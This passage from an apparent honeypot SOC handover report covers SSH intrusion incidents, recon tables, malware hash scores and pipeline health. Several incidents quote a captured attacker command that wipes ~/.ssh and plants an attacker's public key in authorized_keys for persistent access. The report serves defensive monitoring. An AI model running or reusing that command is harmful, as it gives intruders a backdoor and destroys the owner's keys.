| `2026-05-02 16:17:49` | `cowrie.client.version` |
| `2026-05-02 16:17:49` | `cowrie.client.kex` |
| `2026-05-02 16:17:49` | `cowrie.login.success` |
| `2026-05-02 16:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cf3a24a75bb

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-02 16:26 |
| **Last Seen** | 2026-05-02 16:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:26:11` | `cowrie.session.connect` |
| `2026-05-02 16:26:11` | `cowrie.client.version` |
| `2026-05-02 16:26:12` | `cowrie.client.kex` |
| `2026-05-02 16:26:12` | `cowrie.login.success` |
| `2026-05-02 16:26:13` | `cowrie.session.params` |
| `2026-05-02 16:26:13` | `cowrie.command.input` |
| `2026-05-02 16:26:13` | `cowrie.command.failed` |
| `2026-05-02 16:26:13` | `cowrie.log.closed` |
| `2026-05-02 16:26:14` | `cowrie.session.params` |
| `2026-05-02 16:26:14` | `cowrie.command.input` |
| `2026-05-02 16:26:14` | `cowrie.session.file_download` |
| `2026-05-02 16:26:14` | `cowrie.log.closed` |
| `2026-05-02 16:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b01ede763d

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-02 16:26 |
| **Last Seen** | 2026-05-02 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:26:17` | `cowrie.session.connect` |
| `2026-05-02 16:26:17` | `cowrie.client.version` |
| `2026-05-02 16:26:17` | `cowrie.client.kex` |
| `2026-05-02 16:26:18` | `cowrie.login.success` |
| `2026-05-02 16:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a29001eb109

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-02 16:32 |
| **Last Seen** | 2026-05-02 16:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:32:15` | `cowrie.session.connect` |
| `2026-05-02 16:32:15` | `cowrie.client.version` |
| `2026-05-02 16:32:15` | `cowrie.client.kex` |
| `2026-05-02 16:32:15` | `cowrie.login.success` |
| `2026-05-02 16:32:15` | `cowrie.session.params` |
| `2026-05-02 16:32:15` | `cowrie.command.input` |
| `2026-05-02 16:32:15` | `cowrie.command.failed` |
| `2026-05-02 16:32:15` | `cowrie.log.closed` |
| `2026-05-02 16:32:15` | `cowrie.session.params` |
| `2026-05-02 16:32:15` | `cowrie.command.input` |
| `2026-05-02 16:32:15` | `cowrie.session.file_download` |
| `2026-05-02 16:32:15` | `cowrie.log.closed` |
| `2026-05-02 16:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a6b4bc64111

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-02 16:32 |
| **Last Seen** | 2026-05-02 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:32:17` | `cowrie.session.connect` |
| `2026-05-02 16:32:17` | `cowrie.client.version` |
| `2026-05-02 16:32:17` | `cowrie.client.kex` |
| `2026-05-02 16:32:17` | `cowrie.login.success` |
| `2026-05-02 16:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f789150200d8

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-02 16:36 |
| **Last Seen** | 2026-05-02 16:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:36:38` | `cowrie.session.connect` |
| `2026-05-02 16:36:38` | `cowrie.client.version` |
| `2026-05-02 16:36:38` | `cowrie.client.kex` |
| `2026-05-02 16:36:39` | `cowrie.login.success` |
| `2026-05-02 16:36:39` | `cowrie.session.params` |
| `2026-05-02 16:36:39` | `cowrie.command.input` |
| `2026-05-02 16:36:39` | `cowrie.command.failed` |
| `2026-05-02 16:36:39` | `cowrie.log.closed` |
| `2026-05-02 16:36:40` | `cowrie.session.params` |
| `2026-05-02 16:36:40` | `cowrie.command.input` |
| `2026-05-02 16:36:40` | `cowrie.session.file_download` |
| `2026-05-02 16:36:40` | `cowrie.log.closed` |
| `2026-05-02 16:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f3c2e34ec0

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-02 16:36 |
| **Last Seen** | 2026-05-02 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:36:43` | `cowrie.session.connect` |
| `2026-05-02 16:36:43` | `cowrie.client.version` |
| `2026-05-02 16:36:43` | `cowrie.client.kex` |
| `2026-05-02 16:36:44` | `cowrie.login.success` |
| `2026-05-02 16:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3457fd6fa9c8

| Field | Detail |
|---|---|
| **Source IP** | `14.63.198[.]239` |
| **First Seen** | 2026-05-02 16:37 |
| **Last Seen** | 2026-05-02 16:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:37:28` | `cowrie.session.connect` |
| `2026-05-02 16:37:28` | `cowrie.client.version` |
| `2026-05-02 16:37:28` | `cowrie.client.kex` |
| `2026-05-02 16:37:28` | `cowrie.login.success` |
| `2026-05-02 16:37:29` | `cowrie.session.params` |
| `2026-05-02 16:37:29` | `cowrie.command.input` |
| `2026-05-02 16:37:29` | `cowrie.command.failed` |
| `2026-05-02 16:37:29` | `cowrie.log.closed` |
| `2026-05-02 16:37:29` | `cowrie.session.params` |
| `2026-05-02 16:37:29` | `cowrie.command.input` |
| `2026-05-02 16:37:29` | `cowrie.session.file_download` |
| `2026-05-02 16:37:29` | `cowrie.log.closed` |
| `2026-05-02 16:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.198[.]239` to AbuseIPDB if not already reported
- [ ] Block `14.63.198[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a0002a7762

| Field | Detail |
|---|---|
| **Source IP** | `14.63.198[.]239` |
| **First Seen** | 2026-05-02 16:37 |
| **Last Seen** | 2026-05-02 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:37:32` | `cowrie.session.connect` |
| `2026-05-02 16:37:32` | `cowrie.client.version` |
| `2026-05-02 16:37:32` | `cowrie.client.kex` |
| `2026-05-02 16:37:32` | `cowrie.login.success` |
| `2026-05-02 16:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.198[.]239` to AbuseIPDB if not already reported
- [ ] Block `14.63.198[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3882696a167d

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-02 16:50 |
| **Last Seen** | 2026-05-02 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:50:00` | `cowrie.session.connect` |
| `2026-05-02 16:50:00` | `cowrie.client.version` |
| `2026-05-02 16:50:00` | `cowrie.client.kex` |
| `2026-05-02 16:50:01` | `cowrie.login.success` |
| `2026-05-02 16:50:01` | `cowrie.session.params` |
| `2026-05-02 16:50:01` | `cowrie.command.input` |
| `2026-05-02 16:50:01` | `cowrie.command.failed` |
| `2026-05-02 16:50:01` | `cowrie.log.closed` |
| `2026-05-02 16:50:01` | `cowrie.session.params` |
| `2026-05-02 16:50:01` | `cowrie.command.input` |
| `2026-05-02 16:50:01` | `cowrie.session.file_download` |
| `2026-05-02 16:50:01` | `cowrie.log.closed` |
| `2026-05-02 16:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69d58993c4ef

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-02 16:50 |
| **Last Seen** | 2026-05-02 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:50:03` | `cowrie.session.connect` |
| `2026-05-02 16:50:03` | `cowrie.client.version` |
| `2026-05-02 16:50:03` | `cowrie.client.kex` |
| `2026-05-02 16:50:03` | `cowrie.login.success` |
| `2026-05-02 16:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.52.130[.]122` | **30** | 2026-05-02 15:10 | 2026-05-02 15:28 | 50m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.63.198[.]239` | **30** | 2026-05-02 16:08 | 2026-05-02 16:45 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.200.205[.]179` | **30** | 2026-05-02 15:17 | 2026-05-02 15:49 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.62.87[.]27` | **30** | 2026-05-02 15:18 | 2026-05-02 15:55 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.199.224[.]52` | **30** | 2026-05-02 16:07 | 2026-05-02 16:49 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `211.186.79[.]173` | **30** | 2026-05-02 15:10 | 2026-05-02 15:49 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.0.13[.]61` | **30** | 2026-05-02 15:12 | 2026-05-02 16:50 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.163.107[.]154` | **30** | 2026-05-02 16:04 | 2026-05-02 16:35 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.113[.]212` | **29** | 2026-05-02 16:11 | 2026-05-02 16:30 | 52m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.174.114[.]50` | **17** | 2026-05-02 14:53 | 2026-05-02 15:34 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.117[.]84` | **8** | 2026-05-02 16:49 | 2026-05-02 16:53 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `154.26.132[.]223` | **2** | 2026-05-02 16:02 | 2026-05-02 16:37 | 1m | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]116` | **2** | 2026-05-02 15:52 | 2026-05-02 15:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-05-02 16:52 | 2026-05-02 16:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]144` | 1 | 2026-05-02 16:09 | 2026-05-02 16:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.38.205[.]224` | 1 | 2026-05-02 15:09 | 2026-05-02 15:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.20[.]170` | 1 | 2026-05-02 16:47 | 2026-05-02 16:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]50` | 1 | 2026-05-02 14:53 | 2026-05-02 14:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.78.132[.]164` | 1 | 2026-05-02 15:24 | 2026-05-02 15:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]119` | 1 | 2026-05-02 15:52 | 2026-05-02 15:52 | 5s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `218.78.132[.]164` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |
| `101.52.130[.]122` | CN | GDS CHANGAN SERVICES Ltd. | **100** ⚠️ | 50 |
| `101.126.89[.]144` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `43.163.107[.]154` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 24 |
| `14.103.117[.]84` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.113[.]212` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.107[.]50` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `211.186.79[.]173` | KR | SK Broadband Co Ltd | **100** ⚠️ | 22 |
| `103.174.114[.]50` | ID | PT. AwanBit Data Indonesia | **100** ⚠️ | 50 |
| `34.0.13[.]61` | IN | Google LLC | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 340 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 233 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 40 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |

---

## 🔕 False Positive Summary (1693 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1680 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 2038 cases |
| Tool 34  | Credential Extractor        | ✅ 273 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1693 filtered (83.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 40 priority case(s) shown individually · 20 recon entry/entries in table (13 group(s) consolidating 298 session(s)).

---

## 📋 Standing Orders for Next Shift

